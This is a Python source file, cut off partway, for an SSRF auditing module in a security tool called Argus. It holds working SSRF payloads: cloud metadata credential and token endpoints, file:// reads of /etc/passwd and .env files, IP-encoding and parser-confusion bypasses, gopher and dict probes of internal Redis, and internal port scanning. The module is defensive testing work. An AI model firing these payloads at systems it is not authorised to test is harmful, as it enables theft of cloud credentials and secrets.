#!/usr/bin/env python3
"""
auditing_tools/ssrf_finder.py — Server-Side Request Forgery Auditor
═══════════════════════════════════════════════════════════════════════════════

Comprehensive SSRF detection for Argus.

SSRF has two fundamentally different detection modes, and this module
implements both with equal rigor:

  In-band SSRF
    The server's response contains data from the fetched target. Confirmed
    by matching cloud-metadata markers (AccessKeyId, ami-id, computeMetadata),
    file-read markers (root:x:0:0), or internal service banners (redis_version,
    Elasticsearch, Jenkins).

  Blind SSRF
    The server fetches the target but does not reflect the response. Confirmed
    only by an out-of-band interaction — a DNS or HTTP callback to an
    interactsh / Burp Collaborator domain.

Six-phase strategy:

  Phase 1 — Surface discovery
      Extract URL parameters, JSON body fields, and headers that accept URLs.
      Covers the full OWASP Top 25 parameter list plus header injection
      (X-Forwarded-For, X-Real-IP, Referer, X-Custom-IP-Authorization).

  Phase 2 — Baseline profiling
      Establish response length, timing, and status for the unmodified request.
      Detect if the target already returns metadata content (false positive
      guard).

  Phase 3 — OOB confirmation
      Generate unique tokens per probe, point the parameter at the OOB domain,
      and correlate interactions. This is the ONLY reliable way to confirm
      blind SSRF.

  Phase 4 — Cloud metadata
      Probe AWS IMDSv1/v2, GCP, Azure, Alibaba, DigitalOcean, Oracle, and
      Kubernetes metadata endpoints. Supports the IMDSv2 two-step token flow
      if the parameter accepts PUT.

  Phase 5 — File read & internal services
      file:// probes for /etc/passwd, /proc/self/environ, .env, Windows paths.
      http://127.0.0.1:<port> probes with service-banner fingerprinting.

  Phase 6 — Bypass matrix
      Applied only when the raw payload is blocked. Covers decimal, hex, octal,
      short-form, IPv6, IPv4-in-IPv6, userinfo @, backslash, wildcard DNS
      (nip.io, localtest.me), redirect chaining, and URL parser confusion.

Optional protocol abuse (gopher://, dict://, ldap://) is available but
disabled by default — it is inherently more intrusive.

Outputs (into `outdir`):
  • ssrf_findings.json        — full structured report
  • ssrf_candidates.txt       — flat list for triage
  • ssrf_confirmed.txt        — in-band and OOB confirmed findings
  • ssrf_oob.txt              — out-of-band interactions only

Integration:
  main.py → run_one("ssrf") → run_ssrf_scan(urls_file, outdir)
"""

from __future__ import annotations

import json
import logging
import random
import re
import shutil
import string
import subprocess
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.ssrf_finder")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT       = 12
DEFAULT_RETRIES       = 1
USER_AGENT            = "Argus-SSRF-Auditor/1.0"

# Baseline
BASELINE_SAMPLES      = 2

# OOB
INTERACTSH_STARTUP_WAIT = 3.0
OOB_CORRELATION_WAIT    = 8.0       # seconds to wait for callbacks after probes

# Port scan
SCAN_PORTS = [22, 80, 443, 3000, 3306, 5000, 5432, 6379, 8080,
              8443, 8500, 9200, 9300, 11211, 27017, 2375, 6443]
PORT_SCAN_TIMING_DELTA = 1.5        # seconds — open vs closed differential
MAX_PORT_SCAN_TARGETS = 8

# Rate limiting
REQUEST_SLEEP = 0.1

# ═════════════════════════════════════════════════════════════════════════════
#  PARAMETER LISTS
# ═════════════════════════════════════════════════════════════════════════════

# OWASP Top 25 + community-expanded SSRF parameter names
SSRF_PARAMS = {
    # Direct URL parameters
    "url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
    "redirect_url", "redirect_to", "return", "return_url", "returnTo",
    "next", "continue", "forward", "target", "to", "out", "view",
    "dir", "show", "file", "document", "folder", "page", "feed", "site",
    "html", "val", "domain", "callback", "callback_url", "data", "reference",
    "img", "img_url", "image", "image_url", "src", "source", "link",
    "open", "window", "proxy", "fetch", "load", "request", "resource",
    "endpoint", "host", "port", "u", "r", "goto", "jump", "action",
    "checkout", "login", "logout", "service", "webhook", "webhook_url",
    "avatar", "avatar_url", "picture", "picture_url", "thumbnail",
    "import", "import_url", "export", "export_url", "pdf", "pdf_url",
    "screenshot", "screenshot_url", "preview", "preview_url",
    "rss", "rss_url", "xml", "xml_url", "json", "json_url",
    "api", "api_url", "backend", "origin", "source_url", "target_url",
}

# Headers that may carry URLs or IPs
SSRF_HEADERS = [
    "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Host", "X-Forwarded-Server",
    "Referer", "Origin", "X-Custom-IP-Authorization", "Forwarded",
    "True-Client-IP", "CF-Connecting-IP", "X-ProxyUser-Ip", "Client-IP",
]

# ═════════════════════════════════════════════════════════════════════════════
#  CLOUD METADATA ENDPOINTS
# ═════════════════════════════════════════════════════════════════════════════

CLOUD_METADATA = {
    "aws_imdsv1": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "aws_imdsv2_token": [
        "http://169.254.169.254/latest/api/token",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "alibaba": [
        "http://100.100.100.200/latest/meta-data/",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1.json",
    ],
    "oracle": [
        "http://169.254.169.254/opc/v1/instance/",
    ],
    "kubernetes": [
        "https://kubernetes.default.svc/api/v1/secrets",
        "http://127.0.0.1:6443/api/v1/secrets",
        "http://localhost:10255/pods",
    ],
}

# Markers that prove a metadata response
METADATA_MARKERS = [
    "ami-id", "instance-id", "instance-type", "security-credentials",
    "AccessKeyId", "SecretAccessKey", "Token", "computeMetadata",
    "Metadata-Flavor", "service-accounts", "project-id",
    "subscriptionId", "vmId", "resourceGroupName", "opc/v1",
    "droplet_id", "metadata/v1", "kube-system", "kubernetes.io",
]

# ═════════════════════════════════════════════════════════════════════════════
#  FILE READ PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

FILE_READ_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///app/.env",
    "file:///var/www/html/.env",
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
]

FILE_MARKERS = [
    "root:x:0:0", "root:*:0:0", "daemon:", "/bin/bash", "/bin/sh",
    "[extensions]", "[fonts]", "for 16-bit app support",
    "APP_ENV", "DB_PASSWORD", "SECRET_KEY",
]

# ═════════════════════════════════════════════════════════════════════════════
#  INTERNAL SERVICE FINGERPRINTS
# ═════════════════════════════════════════════════════════════════════════════

SERVICE_BANNERS = {
    "redis":      ["redis_version", "-ERR unknown command", "+PONG", "-NOAUTH"],
    "memcached":  ["ERROR", "STAT version", "CLIENT_ERROR"],
    "elasticsearch": ["You Know, for Search", "cluster_name", "lucene_version"],
    "jenkins":    ["Jenkins", "X-Jenkins", "Dashboard [Jenkins]"],
    "grafana":    ["Grafana", "grafana-app"],
    "consul":     ["Consul Agent", "consul"],
    "docker":     ["Docker", "Api-Version", "Docker-Distribution-Api-Version"],
    "kubernetes": ["kube-system", "apiVersion", "kind\": \"Status\""],
    "tomcat":     ["Apache Tomcat", "Tomcat Manager"],
    "mysql":      ["mysql_native_password", "MariaDB", "MySQL"],
    "postgres":   ["PostgreSQL", "FATAL:  password authentication failed"],
    "etcd":       ["etcdserver", "etcdcluster"],
}

# ═════════════════════════════════════════════════════════════════════════════
#  BYPASS MATRIX
# ═════════════════════════════════════════════════════════════════════════════

# Canonical IPs to encode
LOOPBACK_IP   = "127.0.0.1"
METADATA_IP   = "169.254.169.254"

# IP encoding variants — applied to the host portion of a URL
IP_ENCODING_VARIANTS = {
    LOOPBACK_IP: [
        "127.1",
        "127.0.1",
        "0.0.0.0",
        "0",
        "2130706433",           # decimal
        "0x7f000001",           # hex
        "0x7f.0x0.0x0.0x1",     # hex per octet
        "0177.0.0.1",           # octal
        "017700000001",         # octal full
        "[::1]",
        "[::ffff:127.0.0.1]",
        "[::ffff:7f00:1]",
        "[0:0:0:0:0:ffff:7f00:1]",
        "127.0.0.1.nip.io",
        "127.0.0.1.sslip.io",
        "localtest.me",
    ],
    METADATA_IP: [
        "2852039166",           # decimal
        "0xa9fea9fe",           # hex
        "0251.0376.0251.0376",  # octal
        "[::ffff:169.254.169.254]",
        "[::ffff:a9fe:a9fe]",
        "[0:0:0:0:0:ffff:a9fe:a9fe]",
        "169.254.169.254.nip.io",
    ],
}

# URL parser confusion prefixes — prepended to a canonical URL
PARSER_CONFUSION = [
    lambda u: u.replace("://", "://target.com@"),
    lambda u: u + "#@target.com",
    lambda u: u.replace("://", "://evil.com\\@"),
    lambda u: u.replace("://", "://target.com%00@"),
    lambda u: u.replace("://", "://target.com%2f@"),
]

# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"          # query | body | header | path
    status: int = 0
    length: int = 0
    body: str = ""
    content_type: str = ""
    median_time: float = 0.0
    preexisting_markers: set[str] = field(default_factory=set)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "preexisting_markers": sorted(self.preexisting_markers),
        }


@dataclass
class SSRFinding:
    target: str
    param: str
    technique: str              # oob | metadata | file_read | internal | port_scan
    severity: str = "MEDIUM"
    confidence: int = 50
    payload: str = ""
    evidence: str = ""
    bypass_used: str = ""
    oob_token: str = ""
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target":      self.target,
            "param":       self.param,
            "technique":   self.technique,
            "severity":    self.severity,
            "confidence":  self.confidence,
            "payload":     self.payload[:500],
            "evidence":    self.evidence[:500],
            "bypass_used": self.bypass_used,
            "oob_token":   self.oob_token,
            "details":     self.details,
        }


# ═════════════════════════════════════════════════════════════════════════════
#  OOB CAPTURE ENGINE
# ═════════════════════════════════════════════════════════════════════════════

class OOBCapture:
    """
    Out-of-band capture via interactsh-client or a user-supplied domain.

    Mode 1 — user-supplied domain (Burp Collaborator, interactsh dashboard)
        The module generates unique tokens under that domain and writes them
        to a file. You check the dashboard manually.

    Mode 2 — interactsh-client subprocess
        The module spawns `interactsh-client -json`, parses the domain from
        its banner, and reads interaction JSON from stdout in a background
        thread. Correlated tokens are matched in real time.
    """

    def __init__(self, domain: Optional[str] = None, use_interactsh: bool = False):
        self.user_domain = domain
        self.use_interactsh = use_interactsh
        self.domain: Optional[str] = domain
        self.proc: Optional[subprocess.Popen] = None
        self.reader_thread: Optional[threading.Thread] = None
        self.interactions: list[dict] = []
        self.interaction_ids: set[str] = set()
        self.lock = threading.Lock()

    # ── Startup ─────────────────────────────────────────────────────────────
    def start(self) -> bool:
        if self.user_domain:
            self.domain = self.user_domain
            log.info(f"    OOB domain : {self.domain} (manual verification)")
            return True

        if not self.use_interactsh:
            log.info("    OOB        : disabled (no --oob-domain and no --interactsh)")
            return False

        if not shutil.which("interactsh-client"):
            log.warning("    OOB        : interactsh-client not installed")
            return False

        try:
            self.proc = subprocess.Popen(
                ["interactsh-client", "-json", "-silent"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
            )
        except Exception as e:
            log.warning(f"    OOB        : failed to start interactsh-client: {e}")
            return False

        # Read the banner to find the domain
        domain = self._read_banner(timeout=INTERACTSH_STARTUP_WAIT)
        if not domain:
            log.warning("    OOB        : could not parse interactsh domain")
            self.stop()
            return False

        self.domain = domain
        log.info(f"    OOB domain : {domain}")

        # Start interaction reader
        self.reader_thread = threading.Thread(
            target=self._read_interactions, daemon=True,
        )
        self.reader_thread.start()
        return True

    def _read_banner(self, timeout: float) -> Optional[str]:
        import select
        deadline = time.monotonic() + timeout
        stderr = self.proc.stderr
        if not stderr:
            return None

        pattern = re.compile(r"([a-z0-9]{20,}\.(?:oast\.(?:fun|site|pro|online|live)|interact\.sh))")
        collected = ""
        while time.monotonic() < deadline:
            r, _, _ = select.select([stderr], [], [], 0.5)
            if not r:
                continue
            line = stderr.readline()
            if not line:
                break
            collected += line
            m = pattern.search(collected)
            if m:
                return m.group(1)
        return None

    def _read_interactions(self) -> None:
        if not self.proc or not self.proc.stdout:
            return
        for line in self.proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            with self.lock:
                self.interactions.append(obj)
                # interactsh JSON has `full-id` or `unique-id`
                for key in ("full-id", "unique-id", "full_id", "unique_id"):
                    val = obj.get(key)
                    if val:
                        self.interaction_ids.add(str(val).lower())

    # ── Token generation ────────────────────────────────────────────────────
    def new_token(self, prefix: str = "argus") -> str:
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        return f"{prefix}{suffix}"

    def token_url(self, token: str, scheme: str = "http") -> Optional[str]:
        if not self.domain:
            return None
        return f"{scheme}://{token}.{self.domain}/"

    # ── Correlation ─────────────────────────────────────────────────────────
    def check(self, token: str) -> bool:
        with self.lock:
            t = token.lower()
            for i in self.interaction_ids:
                if t in i:
                    return True
        return False

    def wait_and_check(self, tokens: list[str], wait: float = OOB_CORRELATION_WAIT) -> set[str]:
        """Wait for callbacks, then return the set of tokens that fired."""
        if not tokens or not self.use_interactsh:
            return set()
        deadline = time.monotonic() + wait
        fired: set[str] = set()
        while time.monotonic() < deadline:
            for tok in tokens:
                if tok not in fired and self.check(tok):
                    fired.add(tok)
            if len(fired) == len(tokens):
                break
            time.sleep(0.5)
        return fired

    # ── Teardown ────────────────────────────────────────────────────────────
    def stop(self) -> None:
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _extract_surface(url: str) -> list[tuple[str, str, str]]:
    """Return (param, value, location) tuples for every SSRF-prone input."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    out: list[tuple[str, str, str]] = []
    for pname, vals in params.items():
        if pname.lower() in SSRF_PARAMS:
            out.append((pname, vals[0] if vals else "", "query"))
    return out


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe=":/?=&%"))
    )


def _safe_request(
    session: requests.Session,
    method: str,
    url: str,
    headers: Optional[dict] = None,
    json_body: Optional[dict] = None,
    data: Optional[dict] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> Optional[requests.Response]:
    try:
        return session.request(
            method, url,
            headers=headers or {},
            json=json_body,
            data=data,
            timeout=timeout,
            allow_redirects=False,
            verify=False,
        )
    except requests.RequestException as e:
        log.debug(f"request failed: {method} {url}: {e}")
        return None


def _body(resp: requests.Response, limit: int = 200_000) -> str:
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _match_markers(body: str, markers: list[str]) -> list[str]:
    found: list[str] = []
    for m in markers:
        if m in body:
            found.append(m)
    return found


def _severity_for(confidence: int, technique: str) -> str:
    if technique == "oob":
        return "CRITICAL" if confidence >= 90 else "HIGH"
    if technique == "metadata":
        return "CRITICAL"
    if technique == "file_read":
        return "CRITICAL" if confidence >= 90 else "HIGH"
    if technique == "internal":
        return "HIGH" if confidence >= 80 else "MEDIUM"
    if technique == "port_scan":
        return "MEDIUM"
    return "MEDIUM"


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(
    session: requests.Session,
    url: str, param: str, location: str,
) -> Baseline:
    baseline = Baseline(url=url, param=param, location=location)
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        resp = _safe_request(session, "GET", url)
        elapsed = time.monotonic() - start
        times.append(elapsed)
        if resp is None:
            continue
        if not baseline.status:
            baseline.status = resp.status_code
            baseline.length = len(_body(resp))
            baseline.body = _body(resp)
            baseline.content_type = resp.headers.get("Content-Type", "")
            baseline.preexisting_markers = set(
                _match_markers(baseline.body, METADATA_MARKERS + FILE_MARKERS)
            )
        time.sleep(REQUEST_SLEEP)

    if times:
        import statistics
        baseline.median_time = statistics.median(times)
    return baseline


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — OOB CONFIRMATION
# ═════════════════════════════════════════════════════════════════════════════

def test_oob(
    session: requests.Session,
    oob: OOBCapture,
    url: str, param: str, location: str,
    baseline: Baseline,
) -> list[SSRFinding]:
    findings: list[SSRFinding] = []
    if not oob.domain:
        return findings

    token = oob.new_token()
    oob_url = oob.token_url(token)
    if not oob_url:
        return findings

    test_url = _inject_query(url, param, oob_url)
    resp = _safe_request(session, "GET", test_url)
    time.sleep(REQUEST_SLEEP)

    if resp is None:
        return findings

    # For manual mode we cannot confirm — record as candidate
    if not oob.use_interactsh:
        findings.append(SSRFinding(
            target=url, param=param, technique="oob",
            severity="HIGH", confidence=60,
            payload=oob_url, oob_token=token,
            evidence=f"Probe sent to {oob_url} — verify manually in your OOB dashboard",
            details={"mode": "manual"},
        ))
    return findings


def confirm_oob_batch(
    oob: OOBCapture, findings: list[SSRFinding],
) -> list[SSRFinding]:
    """After all probes, wait for callbacks and promote fired tokens to CRITICAL."""
    if not oob.use_interactsh:
        return findings
    tokens = [f.oob_token for f in findings if f.oob_token]
    if not tokens:
        return findings

    log.info(f"    Waiting {OOB_CORRELATION_WAIT:.0f}s for OOB callbacks...")
    fired = oob.wait_and_check(tokens)

    for f in findings:
        if f.oob_token in fired:
            f.severity = "CRITICAL"
            f.confidence = 95
            f.evidence = (
                f"Out-of-band callback received for token {f.oob_token} "
                f"(DNS/HTTP interaction confirmed)"
            )
            f.details["oob_confirmed"] = True

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — CLOUD METADATA
# ═════════════════════════════════════════════════════════════════════════════

def test_cloud_metadata(
    session: requests.Session,
    url: str, param: str, location: str,
    baseline: Baseline,
) -> list[SSRFinding]:
    findings: list[SSRFinding] = []

    for provider, endpoints in CLOUD_METADATA.items():
        if provider == "aws_imdsv2_token":
            continue  # handled separately below

        for endpoint in endpoints:
            test_url = _inject_query(url, param, endpoint)
            resp = _safe_request(session, "GET", test_url)
            time.sleep(REQUEST_SLEEP)
            if resp is None:
                continue

            body = _body(resp)
            new_markers = set(_match_markers(body, METADATA_MARKERS)) - baseline.preexisting_markers

            if new_markers:
                findings.append(SSRFinding(
                    target=url, param=param, technique="metadata",
                    severity="CRITICAL", confidence=95,
                    payload=endpoint,
                    evidence=f"{provider} metadata markers found: {', '.join(sorted(new_markers))}",
                    details={
                        "provider": provider,
                        "markers": sorted(new_markers),
                        "status": resp.status_code,
                        "body_snippet": body[:400],
                    },
                ))
                return findings  # one confirmed provider is enough

    # ── AWS IMDSv2 token flow (if the parameter accepts PUT) ────────────────
    token_endpoint = "http://169.254.169.254/latest/api/token"
    test_url = _inject_query(url, param, token_endpoint)
    resp = _safe_request(
        session, "GET", test_url,
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    )
    if resp and resp.status_code == 200:
        body = _body(resp)
        if len(body) > 20 and all(c in string.ascii_letters + string.digits + "-_" for c in body.strip()):
            findings.append(SSRFinding(
                target=url, param=param, technique="metadata",
                severity="CRITICAL", confidence=85,
                payload=token_endpoint,
                evidence="AWS IMDSv2 token endpoint responded with a token-like string",
                details={"token_length": len(body.strip())},
            ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5a — FILE READ
# ═════════════════════════════════════════════════════════════════════════════

def test_file_read(
    session: requests.Session,
    url: str, param: str, location: str,
    baseline: Baseline,
) -> list[SSRFinding]:
    findings: list[SSRFinding] = []

    for payload in FILE_READ_PAYLOADS:
        test_url = _inject_query(url, param, payload)
        resp = _safe_request(session, "GET", test_url)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue

        body = _body(resp)
        new_markers = set(_match_markers(body, FILE_MARKERS)) - baseline.preexisting_markers

        if new_markers:
            findings.append(SSRFinding(
                target=url, param=param, technique="file_read",
                severity="CRITICAL", confidence=95,
                payload=payload,
                evidence=f"File content markers found: {', '.join(sorted(new_markers))}",
                details={
                    "path": payload,
                    "markers": sorted(new_markers),
                    "status": resp.status_code,
                    "body_snippet": body[:400],
                },
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5b — INTERNAL SERVICE FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def test_internal_services(
    session: requests.Session,
    url: str, param: str, location: str,
    baseline: Baseline,
) -> list[SSRFinding]:
    findings: list[SSRFinding] = []
    scanned = 0

    for port in SCAN_PORTS:
        if scanned >= MAX_PORT_SCAN_TARGETS:
            break

        internal_url = f"http://127.0.0.1:{port}/"
        test_url = _inject_query(url, param, internal_url)
        start = time.monotonic()
        resp = _safe_request(session, "GET", test_url, timeout=5)
        elapsed = time.monotonic() - start
        time.sleep(REQUEST_SLEEP)
        scanned += 1

        if resp is None:
            continue

        body = _body(resp)

        # Try to match a service banner
        for service, banners in SERVICE_BANNERS.items():
            hits = [b for b in banners if b in body]
            if hits:
                findings.append(SSRFinding(
                    target=url, param=param, technique="internal",
                    severity="HIGH", confidence=85,
                    payload=internal_url,
                    evidence=f"Internal {service} service on port {port}: {', '.join(hits[:2])}",
                    details={
                        "port": port, "service": service,
                        "markers": hits, "body_snippet": body[:400],
                    },
                ))
                break

        # Also flag status deltas that suggest an open internal service
        if (baseline.status and resp.status_code != baseline.status
                and resp.status_code not in (0, 404, 502, 503)):
            findings.append(SSRFinding(
                target=url, param=param, technique="port_scan",
                severity="MEDIUM", confidence=60,
                payload=internal_url,
                evidence=f"Internal port {port} returned status {resp.status_code} (baseline {baseline.status})",
                details={"port": port, "status": resp.status_code, "elapsed": round(elapsed, 2)},
            ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — BYPASS MATRIX
# ═════════════════════════════════════════════════════════════════════════════

def _encoded_variants(canonical_url: str) -> list[tuple[str, str]]:
    """
    Generate bypass variants of a canonical URL.
    Returns list of (variant_url, label).
    """
    parsed = urllib.parse.urlparse(canonical_url)
    host = parsed.hostname or ""
    scheme = parsed.scheme or "http"
    path = parsed.path or "/"
    port = f":{parsed.port}" if parsed.port else ""

    variants: list[tuple[str, str]] = []
    if host in IP_ENCODING_VARIANTS:
        for enc in IP_ENCODING_VARIANTS[host]:
            variants.append((f"{scheme}://{enc}{port}{path}", f"ip_encoding:{enc}"))

    # Parser confusion
    for i, fn in enumerate(PARSER_CONFUSION):
        try:
            variants.append((fn(canonical_url), f"parser_confusion:{i}"))
        except Exception:
            pass

    return variants


def test_bypass(
    session: requests.Session,
    url: str, param: str, location: str,
    baseline: Baseline,
    canonical_target: str,
    target_markers: list[str],
    technique_label: str,
) -> list[SSRFinding]:
    """
    Apply the bypass matrix to a canonical target that was previously blocked.
    Only call this after the raw payload failed.
    """
    findings: list[SSRFinding] = []

    for variant, label in _encoded_variants(canonical_target):
        test_url = _inject_query(url, param, variant)
        resp = _safe_request(session, "GET", test_url, timeout=8)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue

        body = _body(resp)
        new_markers = set(_match_markers(body, target_markers)) - baseline.preexisting_markers

        if new_markers:
            findings.append(SSRFinding(
                target=url, param=param, technique=technique_label,
                severity="HIGH", confidence=85,
                payload=variant, bypass_used=label,
                evidence=f"Bypass variant '{label}' succeeded: markers {', '.join(sorted(new_markers))}",
                details={
                    "canonical_target": canonical_target,
                    "variant": variant,
                    "bypass": label,
                    "markers": sorted(new_markers),
                    "body_snippet": body[:400],
                },
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — PROTOCOL ABUSE (optional)
# ═════════════════════════════════════════════════════════════════════════════

def test_protocol_abuse(
    session: requests.Session,
    url: str, param: str, location: str,
    baseline: Baseline,
) -> list[SSRFinding]:
    """
    Probe gopher://, dict://, and ldap:// support. Read-only — no destructive
    commands are sent (no FLUSHALL, no SET, no DEL).
    """
    findings: list[SSRFinding] = []

    # gopher with a benign HTTP/1.0 GET to a known internal service
    gopher_payloads = [
        ("gopher://127.0.0.1:6379/_INFO", "redis_info"),
        ("gopher://127.0.0.1:11211/_stats", "memcached_stats"),
        ("dict://127.0.0.1:6379/info", "dict_redis"),
        ("ldap://127.0.0.1:389/", "ldap"),
    ]

    for payload, label in gopher_payloads:
        test_url = _inject_query(url, param, payload)
        resp = _safe_request(session, "GET", test_url, timeout=6)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue

        body = _body(resp)
        # A successful protocol fetch typically returns data from the service
        for service, banners in SERVICE_BANNERS.items():
            if any(b in body for b in banners):
                findings.append(SSRFinding(
                    target=url, param=param, technique="internal",
                    severity="HIGH", confidence=80,
                    payload=payload,
                    evidence=f"Protocol {label} returned {service} banner data",
                    details={"protocol": label, "service": service, "body_snippet": body[:400]},
                ))
                break

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PER-SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: requests.Session,
    oob: OOBCapture,
    url: str, param: str, location: str,
    *,
    test_metadata: bool = True,
    test_file_read_enabled: bool = True,
    test_internal: bool = True,
    test_bypass_enabled: bool = True,
    test_protocols: bool = False,
) -> tuple[Baseline, list[SSRFinding]]:
    baseline = build_baseline(session, url, param, location)
    findings: list[SSRFinding] = []

    # ── OOB (blind) ─────────────────────────────────────────────────────────
    oob_findings = test_oob(session, oob, url, param, location, baseline)
    findings.extend(oob_findings)

    # ── Metadata ────────────────────────────────────────────────────────────
    metadata_findings: list[SSRFinding] = []
    if test_metadata:
        metadata_findings = test_cloud_metadata(session, url, param, location, baseline)
        findings.extend(metadata_findings)

    # ── File read ───────────────────────────────────────────────────────────
    file_findings: list[SSRFinding] = []
    if test_file_read_enabled:
        file_findings = test_file_read(session, url, param, location, baseline)
        findings.extend(file_findings)

    # ── Internal services ───────────────────────────────────────────────────
    if test_internal:
        findings.extend(test_internal_services(session, url, param, location, baseline))

    # ── Protocol abuse ──────────────────────────────────────────────────────
    if test_protocols:
        findings.extend(test_protocol_abuse(session, url, param, location, baseline))

    # ── Bypass matrix (only when raw failed) ────────────────────────────────
    if test_bypass_enabled and not metadata_findings:
        bypass = test_bypass(
            session, url, param, location, baseline,
            CLOUD_METADATA["aws_imdsv1"][0],
            METADATA_MARKERS,
            "metadata",
        )
        findings.extend(bypass)

    if test_bypass_enabled and not file_findings:
        bypass = test_bypass(
            session, url, param, location, baseline,
            "file:///etc/passwd",
            FILE_MARKERS,
            "file_read",
        )
        findings.extend(bypass)

    return baseline, findings


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_ssrf_scan(
    urls_file: Path,
    outdir: Path,
    *,
    oob_domain: Optional[str] = None,
    use_interactsh: bool = False,
    headers: Optional[dict] = None,
    test_metadata: bool = True,
    test_file_read_enabled: bool = True,
    test_internal: bool = True,
    test_bypass_enabled: bool = True,
    test_protocols: bool = False,
    max_surfaces: int = 300,
) -> Path:
    """
    Run the SSRF audit against every URL in `urls_file`.

    Returns the path to `ssrf_findings.json`.
    """
    start = time.monotonic()

    urls = _load_urls(urls_file)
    surfaces: list[tuple[str, str, str]] = []
    for url in urls:
        surfaces.extend(_extract_surface(url))
    if len(surfaces) > max_surfaces:
        log.warning(f"  Capping at {max_surfaces} (url, param) surfaces (had {len(surfaces)})")
        surfaces = surfaces[:max_surfaces]

    outdir.mkdir(parents=True, exist_ok=True)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} SSRF-prone parameter(s)")
    if headers:
        log.info("  Auth   : headers supplied")
    log.info("")

    if not surfaces:
        log.warning("  No SSRF-prone parameters found — writing empty report")
        return _write_empty_report(outdir, urls_file, start)

    # ── OOB setup ───────────────────────────────────────────────────────────
    oob = OOBCapture(domain=oob_domain, use_interactsh=use_interactsh)
    oob_active = oob.start()

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    session.verify = False

    # ── Audit each surface ──────────────────────────────────────────────────
    results: list[dict] = []
    all_findings: list[SSRFinding] = []

    try:
        for i, (url, param, location) in enumerate(surfaces, 1):
            log.info(f"  [{i:>3}/{len(surfaces)}] {url[:70]}  param={param}")
            try:
                baseline, findings = audit_surface(
                    session, oob, url, param, location,
                    test_metadata=test_metadata,
